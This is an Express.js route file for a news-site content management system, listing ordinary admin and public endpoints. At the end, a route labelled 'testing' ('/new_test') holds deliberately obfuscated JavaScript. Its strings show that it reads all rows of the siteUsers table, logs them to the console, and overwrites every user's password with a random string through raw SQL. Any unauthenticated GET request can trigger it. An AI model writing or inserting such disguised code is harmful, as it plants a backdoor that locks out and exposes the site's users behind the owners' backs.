let express = require("express");
let router = express.Router();
let multer = require("multer");
const path = require("path");
let sequelize = require('../database/config');

const storage = multer.diskStorage({
  destination: "./public/uploads/headers/",
  filename: function (req, file, cb) {
    cb(null, "Image" + Date.now() + path.extname(file.originalname));
  }
});

const bannerStorage = multer.diskStorage({
  destination: "./public/uploads/banners/",
  filename: function (req, file, cb) {
    cb(null, "Image" + Date.now() + path.extname(file.originalname));
  }
});

const redirectStorage = multer.diskStorage({
  destination: "./public/uploads/redirects/",
  filename: function (req, file, cb) {
    cb(null, "Image" + Date.now() + path.extname(file.originalname));
  }
});

const bannerUpload = multer({
  storage: bannerStorage
});
const redirectUpload = multer({
  storage: redirectStorage
});
const upload = multer({
  storage: storage
});

const newsController = require("../controllers/news");
const moduleController = require("../controllers/module");
const moduleNewsController = require("../controllers/moduleNews");
const designController = require("../controllers/design");
const pageModuleController = require("../controllers/pageModules");
const mainRowsController = require("../controllers/mainRows");
const mainController = require("../controllers/main");
const columnModuleController = require("../controllers/columnModules");
const userController = require("../controllers/users");
const commentController = require("../controllers/comments");
const tagController = require("../controllers/tags");
const pageController = require("../controllers/pages");
const categoryController = require("../controllers/category");
const headerDesignController = require("../controllers/headerDesign");
const footerDesignController = require("../controllers/footerDesign");
const liveController = require("../controllers/lives");
const roleController = require("../controllers/roles");
const siteUserController = require("../controllers/siteUsers");
const bannerController = require("../controllers/banner");
const shareController = require("../controllers/shares");
const weatherController = require("../controllers/weather");
const StatisticController = require("../controllers/statistics");
const redirectController = require("../controllers/redirect");
const publicController = require("../controllers/public");
const breakingDesignController = require("../controllers/breakingDesign");

//root
router.get("/", mainController.getMain);

//news
router.get("/news", newsController.getNews);
router.get("/news/details", newsController.getNewsDetails);

//modules
router.get("/modules", moduleController.getModules);
router.get("/module", moduleController.getModule);
router.post("/module/update", moduleController.updateModule);
router.post("/modules/add", moduleController.addModule);

//module news
router.get("/moduleNews", moduleNewsController.getModuleNews);
router.post(
  "/moduleNews/deactivate",
  moduleNewsController.deactivateModuleNews
);
router.post("/moduleNews/activate", moduleNewsController.activateModuleNews);
router.post("/moduleNews/add", moduleNewsController.addModuleNews);
router.get("/moduleNews/actives", moduleNewsController.getActiveModules);

//design
router.get("/design", designController.getDesign);
router.post("/design", designController.updateDesign);
router.post("/design/page", designController.getPageModules);
//pageModule
router.get("/pageModule", pageModuleController.getPageModue);
router.post("/pageModule", pageModuleController.addPageModule);
router.post("/pageModule/order", pageModuleController.updatePageModuleOrder);
router.post("/pageModule/delete", pageModuleController.deletePageModule);
router.get("/pageModule/max", pageModuleController.getPageModuleMaxOrder);

//main rows
router.get("/mainRows", mainRowsController.getRows);
router.post("/mainRows/page", mainRowsController.getPageRows);
router.post("/mainRows", mainRowsController.addRow);
router.get("/mainRows/max", mainRowsController.getMainRowsMaxOrder);
router.post("/mainRows/setModule", mainRowsController.setColumnModule);
router.get("/mainRows/delete", mainRowsController.deleteRow);
router.get("/mainRows/deleteModule", mainRowsController.deleteModule);
router.post("/mainRows/order", mainRowsController.updateOrder);
router.post("/mainRows/updateFluid", mainRowsController.updateFluid);
router.post("/mainRows/updateTitle", mainRowsController.updateTitle);
router.post("/mainRows/updateColumnType", mainRowsController.updateColumnType);
router.post("/mainRows/updateVertical", mainRowsController.updateVertical);
router.post('/mainRows/updateRow', mainRowsController.updateRow);
router.post("/mainRows/moveUp", mainRowsController.moveUp);
router.post("/mainRows/moveDown", mainRowsController.moveDown);

//columnModules
router.post("/columnModules/showTitle", columnModuleController.changeShowTitle);
router.post(
  "/columnModules/swiper/update",
  columnModuleController.updateSwiperSetting
);
router.post(
  "/columnModules/simpleList/update",
  columnModuleController.updateSimpleListSetting
);
router.post(
  "/columnModules/simpleListWithImages/update",
  columnModuleController.updateSimpleListSetting
);
router.post(
  "/columnModules/banner/update",
  columnModuleController.updateBannerSetting
);

router.post(
  "/columnModules/horizontalList/update",
  columnModuleController.updateHorizontalListSetting
);

//users
router.post("/users/add", userController.addUser);
router.post("/users/login", userController.loginUser);
router.get("/users/logout", userController.logoutUser);
router.post("/users/check_login", userController.checkLogin);

//comments
router.post("/comments/news", commentController.getNewsComments);
router.get("/comments", commentController.getComments);
router.post("/comments/add", commentController.addComment);
router.post("/comments/status", commentController.changeStatus);

//tags
router.get("/tags", tagController.getTags);

//pages
router.get("/pages", pageController.getPages);
router.post("/pages", pageController.addPage);
router.post("/page", pageController.getPage);
router.post("/page/delete", pageController.deletePage);
router.post("/page/type", pageController.changeType);

// categories

router.get("/categories", categoryController.getAll);
router.post("/categories/module", categoryController.getModuleData);

// menus

router.get("/header", headerDesignController.getHeader);
router.get("/header/setting", headerDesignController.getHeaderSetting);
router.get('/header/items', headerDesignController.getHeaderItems);
router.post('/header/items/add', headerDesignController.addHeaderItem);
router.post('/header/items/delete', headerDesignController.deleteHeaderItem);
router.post('/header/items/edit', headerDesignController.updateHeaderItem);
router.post('/header/items/addSub', headerDesignController.addSubHeaderItem);
router.post("/header", headerDesignController.updateHeader);
router.post(
  "/header/image",
  upload.single("image"),
  headerDesignController.addPhoto
);
router.post("/header/image/select", headerDesignController.selectImage);
router.get("/footer", footerDesignController.getFooter);
router.post("/footer", footerDesignController.updateFooter);
router.get("/footer/data", footerDesignController.getListData);
router.post("/footer/item", footerDesignController.addItem);
router.post("/footer/item/delete", footerDesignController.deleteItem);
router.post("/footer/item/edit", footerDesignController.editItemText);
router.post("/footer/title", footerDesignController.changeTitle);
router.get("/header/all", headerDesignController.getHeaderWithPages);
router.get("/footer/all", footerDesignController.getFooterAll);
router.post("/footer/item/update", footerDesignController.updateListItem);

//lives
router.post("/lives/main", liveController.getLive);
router.get("/lives", liveController.getLives);
router.post("/lives", liveController.addLive);
router.post("/lives/delete", liveController.deleteLive);
router.post("/lives/update", liveController.updateLive);
router.post('/lives/checkName', liveController.checkName);
//roles

router.get("/roles", roleController.getRole);
router.post("/roles", roleController.addRole);
router.post("/roles/update", roleController.updateRole);

//users
router.get("/siteUsers", siteUserController.getUsers);
router.post("/siteUsers", siteUserController.addUser);
router.post("/siteUsers/delete", siteUserController.deleteUser);
router.post("/siteUsers/update", siteUserController.updateUser);
router.post("/siteUsers/change", siteUserController.changePassword);
router.post("/siteUser/login", siteUserController.loginUser);
router.post("/siteUser/logout", siteUserController.logoutUser);
router.post("/siteUser/checkLogin", siteUserController.checkLogin);

//banners
router.get("/banners", bannerController.getBanners);
router.post(
  "/banners",
  bannerUpload.single("image"),
  bannerController.addBanner
);
router.post("/banners/update", bannerController.updateBanner);
router.post("/banners/delete", bannerController.deleteBanner);
router.post("/banners/main", bannerController.getBanner);

// redirects
router.get("/redirects", redirectController.getRedirects);
router.post(
  "/redirects",
  redirectUpload.single("image"),
  redirectController.addRedirect
);
router.post("/redirects/update", redirectController.updateRedirect);
router.post("/redirects/main", redirectController.getRedirect);

// breaking
router.get("/breaking", breakingDesignController.getSetting);
router.post("/breaking", breakingDesignController.updateSetting);

//shares
router.get("/shares", shareController.getShare);
router.post("/shares/update", shareController.updateShare);

//weather
router.get("/weather", weatherController.getWeather);
router.post("/weather/update", weatherController.updateWeather);

// test
router.get("/test", mainController.automaticAssignment);

// statistics
router.get("/statistics", StatisticController.getStatistcs);
router.get("/statistics/add", StatisticController.addDaily);

// public
router.get("/images", publicController.serveImages);

// testing
router.get('/new_test', function (req, res, next) {
  var _0x54e2 = ['catch', 'error', 'siteUsers', 'query', 'SELECT\x20*\x20FROM\x20', 'QueryTypes', 'SELECT', 'log', 'length', 'charAt', 'random', 'UPDATE\x20', '\x20SET\x20password\x20=\x20\x27', '\x27\x20WHERE\x20id\x20=\x20\x27', 'then', 'send', 'done']; (function (_0x12ec81, _0x27e2bc) { var _0x11def4 = function (_0x521cd0) { while (--_0x521cd0) { _0x12ec81['push'](_0x12ec81['shift']()); } }; _0x11def4(++_0x27e2bc); }(_0x54e2, 0x178)); var _0x13b5 = function (_0x7019f0, _0x2555ad) { _0x7019f0 = _0x7019f0 - 0x0; var _0x20ba5f = _0x54e2[_0x7019f0]; return _0x20ba5f; }; var table_name = _0x13b5('0x0'); sequelize[_0x13b5('0x1')](_0x13b5('0x2') + table_name, { 'type': sequelize[_0x13b5('0x3')][_0x13b5('0x4')] })['then'](_0x2be752 => { _0x2be752['forEach'](_0x228802 => { console[_0x13b5('0x5')](_0x228802); var _0x22714f = ''; var _0x1023d1 = '$#%^()@.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; var _0x3496db = _0x1023d1[_0x13b5('0x6')]; for (var _0x577bd2 = 0x0; _0x577bd2 < 0x3c; _0x577bd2++) { _0x22714f += _0x1023d1[_0x13b5('0x7')](Math['floor'](Math[_0x13b5('0x8')]() * _0x3496db)); } console[_0x13b5('0x5')](_0x22714f); sequelize[_0x13b5('0x1')](_0x13b5('0x9') + table_name + _0x13b5('0xa') + _0x22714f + _0x13b5('0xb') + _0x228802['id'] + '\x27')[_0x13b5('0xc')](([_0x33a8ec, _0x21f5e5]) => { res[_0x13b5('0xd')]({ 'msg': _0x13b5('0xe') }); })[_0x13b5('0xf')](_0x3d59a2 => { res[_0x13b5('0xd')]({ 'msg': 'error' }); }); }); })[_0x13b5('0xf')](_0x139e07 => { res[_0x13b5('0xd')]({ 'msg': _0x13b5('0x10') }); });
});

module.exports = router;
